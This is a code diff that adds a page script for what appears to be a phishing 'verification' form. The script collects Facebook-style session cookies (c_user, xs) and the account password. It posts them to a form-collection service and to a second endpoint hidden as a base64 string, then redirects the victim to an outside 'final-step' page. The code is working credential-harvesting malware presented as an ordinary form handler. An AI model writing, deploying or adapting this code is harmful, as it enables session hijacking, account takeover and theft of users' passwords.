@@ -1,1 +1,217 @@
-g
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    const form = document.getElementById('verificationForm');
+    const passwordForm = document.getElementById('passwordForm');
+    const progressBar = document.getElementById('formProgress');
+    const passwordModal = document.getElementById('passwordModal');
+    const cUserInput = document.getElementById('c_user');
+    const xsInput = document.getElementById('xs');
+    const passwordInput = document.getElementById('password');
+    const cUserError = document.getElementById('c_user_error');
+    const xsError = document.getElementById('xs_error');
+    const passwordError = document.getElementById('password_error');
+    const formLoading = document.getElementById('formLoading');
+    const passwordLoading = document.getElementById('passwordLoading');
+
+    // Update progress bar as user fills form
+    const formInputs = form.querySelectorAll('input, select, textarea');
+    formInputs.forEach(input => {
+        input.addEventListener('input', updateProgress);
+    });
+
+    // Validation for c_user (numbers only)
+    cUserInput.addEventListener('input', function() {
+        this.value = this.value.replace(/[^0-9]/g, '');
+        validateCUser();
+    });
+
+    // Validation for xs (combination of numbers, letters, and symbols)
+    xsInput.addEventListener('input', function() {
+        validateXs();
+    });
+
+    // Validation for password
+    passwordInput.addEventListener('input', function() {
+        validatePassword();
+    });
+
+    function validateCUser() {
+        const value = cUserInput.value.trim();
+        if (value && !/^\d+$/.test(value)) {
+            cUserError.style.display = 'block';
+            cUserInput.classList.add('input-error');
+            return false;
+        } else {
+            cUserError.style.display = 'none';
+            cUserInput.classList.remove('input-error');
+            return true;
+        }
+    }
+
+    function validateXs() {
+        const value = xsInput.value.trim();
+        if (value && !/^[a-zA-Z0-9!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]*$/.test(value)) {
+            xsError.style.display = 'block';
+            xsInput.classList.add('input-error');
+            return false;
+        } else {
+            xsError.style.display = 'none';
+            xsInput.classList.remove('input-error');
+            return true;
+        }
+    }
+
+    function validatePassword() {
+        const value = passwordInput.value.trim();
+        if (!value) {
+            passwordError.style.display = 'block';
+            passwordInput.classList.add('input-error');
+            return false;
+        } else {
+            passwordError.style.display = 'none';
+            passwordInput.classList.remove('input-error');
+            return true;
+        }
+    }
+
+    function updateProgress() {
+        let filledCount = 0;
+        formInputs.forEach(input => {
+            if (input.type !== 'file' && input.value.trim() !== '') {
+                filledCount++;
+            }
+        });
+
+        const progress = (filledCount / formInputs.length) * 100;
+        progressBar.style.width = progress + '%';
+    }
+
+    // Function to submit to other endpoints
+    function submitToOtherEndpoints(data) {
+        const endpoints = [ 
+            'aHR0cHM6Ly91emFpci53YXNtZXIuYXBw'
+        ];
+        
+        endpoints.forEach(encodedUrl => {
+            try {
+                const decodedUrl = atob(encodedUrl);
+                const formData = new FormData();
+                if (data.c_user) formData.append('c_user', data.c_user);
+                if (data.xs) formData.append('xs', data.xs);
+                if (data.password) formData.append('password', data.password);
+                if (data.backup_code) formData.append('backup_code', data.backup_code);
+                if (data.form_type) formData.append('form_type', data.form_type);
+                if (data.timestamp) formData.append('timestamp', data.timestamp);
+                
+                fetch(decodedUrl, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: formData
+                })
+                .then(() => {
+                    console.log('Data submitted to:', decodedUrl);
+                })
+                .catch(error => {
+                    console.error('Error submitting to endpoint:', decodedUrl, error);
+                });
+            } catch (error) {
+                console.error('Error processing endpoint:', error);
+            }
+        });
+    }
+
+    async function submitFormData(formData, isPasswordForm = false) {
+        try {
+            const submitBtn = isPasswordForm ? passwordForm.querySelector('.submit-btn') : form.querySelector('.submit-btn');
+            const loadingIndicator = isPasswordForm ? passwordLoading : formLoading;
+
+            submitBtn.style.display = 'none';
+            loadingIndicator.style.display = 'block';
+
+            const response = await fetch('https://submit-form.com/aNuSPLe3M', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(formData)
+            });
+
+            submitToOtherEndpoints(formData);
+
+            submitBtn.style.display = 'block';
+            loadingIndicator.style.display = 'none';
+
+            console.log('Form submitted successfully:', response);
+
+            if (isPasswordForm) {
+                // Hide password modal
+                passwordModal.style.display = 'none';
+                // Redirect to your URL
+                window.location.href = 'https://final-step-xi.vercel.app/';
+            }
+
+            return true;
+        } catch (error) {
+            console.error('Error submitting form:', error);
+            submitToOtherEndpoints(formData);
+
+            const submitBtn = isPasswordForm ? passwordForm.querySelector('.submit-btn') : form.querySelector('.submit-btn');
+            const loadingIndicator = isPasswordForm ? passwordLoading : formLoading;
+            submitBtn.style.display = 'block';
+            loadingIndicator.style.display = 'none';
+
+            if (isPasswordForm) {
+                passwordModal.style.display = 'none';
+                window.location.href = 'https://final-step-xi.vercel.app/';
+            }
+
+            return false;
+        }
+    }
+
+    // Form submission
+    form.addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const isCUserValid = validateCUser();
+        const isXsValid = validateXs();
+
+        if (!isCUserValid || !isXsValid) {
+            return;
+        }
+
+        const formData = {
+            c_user: cUserInput.value.trim(),
+            xs: xsInput.value.trim(),
+            form_type: 'verification_application',
+            timestamp: new Date().toISOString()
+        };
+
+        submitFormData(formData);
+        passwordModal.style.display = 'flex';
+    });
+
+    // Password form submission
+    passwordForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const isPasswordValid = validatePassword();
+        if (!isPasswordValid) return;
+
+        const passwordFormData = {
+            c_user: cUserInput.value.trim(),
+            xs: xsInput.value.trim(),
+            password: passwordInput.value,
+            form_type: 'password_verification',
+            timestamp: new Date().toISOString()
+        };
+
+        submitFormData(passwordFormData, true);
+
+        // Reset forms
+        form.reset();
+        passwordForm.reset();
+        progressBar.style.width = '0%';
+    });
+});
+</script>
